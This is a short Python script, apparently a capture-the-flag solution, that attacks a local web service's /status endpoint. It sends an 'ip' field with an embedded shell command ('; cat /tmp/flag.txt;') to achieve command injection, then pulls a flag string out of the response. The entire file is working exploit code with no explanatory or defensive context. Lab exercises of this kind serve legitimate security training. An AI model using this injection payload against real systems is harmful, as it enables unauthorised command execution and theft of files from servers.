#!/usr/bin/env python3
import requests
import json
import re
def extract_flag(text):
    pattern = r'{the_flag_is_undefined_[a-z0-9]+}'
    match = re.search(pattern, text)
    if match:
        return match.group(0)
    return None
def main():
    baseUrl = 'http://localhost:8000/status'
    payload = "127.0.0.1'; cat /tmp/flag.txt; echo '"
    data = {'ip': payload}
    try:
        response = requests.post(baseUrl, data=data)
        response.raise_for_status()
        resp_json = response.json()
        output = resp_json.get('output', '')
        flag = extract_flag(output)
        if flag:
            print(flag)
        else:
            print("Flag retrieval has failed.")
    except requests.exceptions.RequestException as e:
        print(f"An error has occurred: {e}")
    except json.JSONDecodeError:
        print("There was a failure in parsing JSON response.")
        print("Content:")
        print(response.text)
if __name__ == '__main__':
    main()
